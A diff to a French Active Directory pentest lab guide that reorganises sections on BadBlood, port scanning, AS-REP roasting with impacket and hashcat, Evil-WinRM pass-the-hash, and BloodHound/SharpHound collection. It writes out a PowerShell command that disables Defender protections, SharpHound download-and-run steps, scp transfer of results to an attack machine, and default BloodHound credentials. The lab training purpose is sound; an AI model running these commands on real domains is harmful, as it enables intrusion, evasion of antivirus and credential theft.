@@ -15,14 +15,20 @@
 
 ## Mise en place de BadBlood
 
+
+Afin de rendre l'Active Directory vulnérable le script **BadBlood** est utilisé, il génère de nombreux groupes et utilisateurs avec de mauvaises permissions ainsi que des paramètres générant des failles exploitables comme c'est souvent le cas en entreprise.
+
+Il est utilisé pour tester BloodHound, s’entraîner à l’attaque/défense AD et simuler des scénarios réels sans impacter un vrai environnement de production.
+
+[Lien vers la page GitHub du créateur de BadBlood](https://github.com/davidprowe/BadBlood)
+
+
 <br>
 
+
 > [!NOTE]
-> * Afin de rendre l'Active Directory vulnérable le script **BadBlood** est utilisé, il génère de nombreux groupes et utilisateurs avec de mauvaises permissions ainsi que des paramètres générant des failles exploitables comme c'est souvent le cas en entreprise.
-> 
-> * ⚠️ Ne sourtout pas utiliser ce script sur un DC d'entreprise (dommages non réversibles).
-> 
-> * [Lien vers la page GitHub du créateur de BadBlood](https://github.com/davidprowe/BadBlood)
+> ⚠️ Ne sourtout pas utiliser ce script sur un DC d'entreprise (dommages non réversibles).
+
 
 <br>
 
@@ -39,7 +45,7 @@ git clone https://github.com/davidprowe/badblood.git
 
 
 
-## Découverte des services
+## Scan de Ports et services
 ```sh
 sudo nmap -sV 10.0.0.1
 ```
@@ -52,7 +58,7 @@ sudo nmap -sV 10.0.0.1
 
 
 
-# __PING CASTLE__
+## __PING CASTLE__
 
 * Ping Castle permet de faire un état de santé général de l'Active Directory.
 * Cet outils est basé sur les critères de sécurités comme CIS Benchmarks, ANSSI
@@ -190,7 +196,7 @@ sudo hashcat -m 18200 -a 0 berniepatehash.txt /usr/share/wordlists/rockyou.txt -
 
 ## __DUMP AD__
 
-
+Informations similaires à Ping Castle
 
 * ldapdomaindump
   * Dumper les utilisateurs AD
@@ -375,7 +381,7 @@ Récupérer son ticket kerberos
 impacket-GetNPUsers TSSR-CYBER.FR/EDDIE_ROACH -no-pass
 ```
 
-Evilwinrm permet aussi de se conencter avec un hash NTLM (Pass-the-Hash) et de charger des scripts en mémoire pour éviter la détection.
+Evilwinrm permet aussi de se connecter avec un hash NTLM (Pass-the-Hash) et de charger des scripts en mémoire pour éviter la détection.
 
 
 
@@ -392,7 +398,59 @@ Evilwinrm permet aussi de se conencter avec un hash NTLM (Pass-the-Hash) et de c
 
 # __BLOODHOUND__
 
-installation de Docker-Compose sur Kali
+BloodHound collecte les relations AD (sessions, groupes, ACL, délégations, trusts…) et les modélise sous forme de graphe et permet d’identifier des chemins d’attaque menant à des comptes à privilèges.
+
+BloodHound est principalement un outils RedTeam, mais il peut aussi servir à comprendre comment un attaquant peut escalader ses privilèges dans un domaine AD et à prioriser les failles de configuration à corriger. (BlueTeam)
+
+## Éxécuter SharpHound.exe
+
+Lancer l'exe sur une machine du domaine
+
+### Désactiver Defender
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisablePrivacyMode $true
+```
+
+
+### Télécharger SharpHound
+```powershell
+wget https://github.com/SpecterOps/SharpHound/releases/download/v2.8.0/SharpHound_v2.8.0+debug_windows_x86.zip -OutFile C:\Users\Administrateur\Downloads\SharpHound.zip
+```
+
+
+### Dézipper et exécuter SharpHound
+```powershell
+sl C:\Users\$env:USERNAME\Downloads
+Expand-Archive -Path SharpHound.zip -DestinationPath .\SharpHound
+cd .\SharpHound\
+.\SharpHound.exe -d $env:USERDNSDOMAIN
+```
+
+Après exécution du script un fichier "20260108151307_BloodHound.zip" apparîtera il faut l'importer dans la machine où se trouve le serveur web installé avec doker-compose.
+
+
+<br>
+
+---
+
+
+### Transférer le fichier vers la machine d'attaque 
+```sh
+scp -P 1111 administrateur@10.0.0.1:/C:/Users/Administrateur/Desktop/20260108151307_BloodHound.zip .
+```
+
+### Réactiver Defender après avoir transféré le fichier
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $false -DisableIntrusionPreventionSystem $false -DisableIOAVProtection $false -DisableScriptScanning $false -EnableControlledFolderAccess Enabled -EnableNetworkProtection Enabled
+```
+
+
+<br>
+
+---
+
+
+### Installation de Docker-Compose sur Kali
 ```sh
 sudo apt install -y docker.io
 sudo systemctl enable docker --now
@@ -402,76 +460,37 @@ sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose
 docker-compose --version
 ```
 
-Conteneur BloodHound
+
+<br>
+
+---
+
+
+### Lancer le conteneur BloodHound
+
 ```sh
+# Créer le dossier, se positionner dedans
 mkdir bloodhound && cd bloodhound
-```
 
-Téléchargement et création du fichier docker-compose Bloodhound (fichier de IT-Connect)
-```sh
+# Téléchargement et création du fichier docker-compose Bloodhound (fichier de IT-Connect)
 sudo wget https://raw.githubusercontent.com/SpecterOps/bloodhound/main/examples/docker-compose/docker-compose.yml -O ~/Documents/docker-compose-Bloodhound.yml
-```
 
-Pour lancer le docker compose en arrière plan
-```sh
+# Pour lancer le docker compose en arrière plan
 sudo docker-compose -f ~/Documents/docker-compose-BloodHound.yml up -d
-```
 
-Arrêter le conteneur en arrière plan
-```sh
+# Arrêter le conteneur en arrière plan
 sudo docker-compose -f docker-compose-BloodHound.yml down
 ```
 
 
 <br>
 
-
-Désactiver Defender
-```powershell
-Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisablePrivacyMode $true
-```
-
-Télécharger SharpHound
-```powershell
-wget https://github.com/SpecterOps/SharpHound/releases/download/v2.8.0/SharpHound_v2.8.0+debug_windows_x86.zip -OutFile C:\Users\Administrateur\Downloads\SharpHound.zip
-```
-
-Dézipper et exécuter SharpHound
-```powershell
-sl C:\Users\$env:USERNAME\Downloads
-Expand-Archive -Path SharpHound.zip -DestinationPath .\SharpHound
-cd .\SharpHound\
-.\SharpHound.exe -d $env:USERDNSDOMAIN
-```
-Après exécution du script un fichier "20260108151307_BloodHound.zip" apparîtera il faut l'importer dans la machine où se trouve le serveur web installé avec doker-compose.
-
-<br>
-
-Transférer le fichier vers la machine d'attaque 
-```sh
-scp -P 1111 administrateur@10.0.0.1:/C:/Users/Administrateur/Desktop/20260108151307_BloodHound.zip .
-```
-
-Déziper BloodHound.zip dans un dossier
-```sh
-mkdir BH_extract
-sudo unzip 20260108151307_BloodHound.zip -d BH_extract
-```
-
-Activer Defender
-```powershell
-Set-MpPreference -DisableRealtimeMonitoring $false -DisableIntrusionPreventionSystem $false -DisableIOAVProtection $false -DisableScriptScanning $false -EnableControlledFolderAccess Enabled -EnableNetworkProtection Enabled
-```
+---
 
 
+### Se connecter sur la page web de BloodHound 
 
-<br>
-
-
-
-Se connecter sur la page web de BloodHound et changer le mot de passe
-
-Identifiants indiqués dans le fichier docker-compose.yml
+Identifiants indiqués dans le fichier docker-compose.yml (il faudra changer le mot de passe)
 ```
 BloodHound 
 http://localhost:8080
@@ -485,4 +504,4 @@ user : neo4j
 password : bloodhoundcommunityedition
 ```
 
-Aller dans Upload et charger les fichiers 
+Aller dans Upload et charger le fichier "20260108151307_BloodHound.zip"
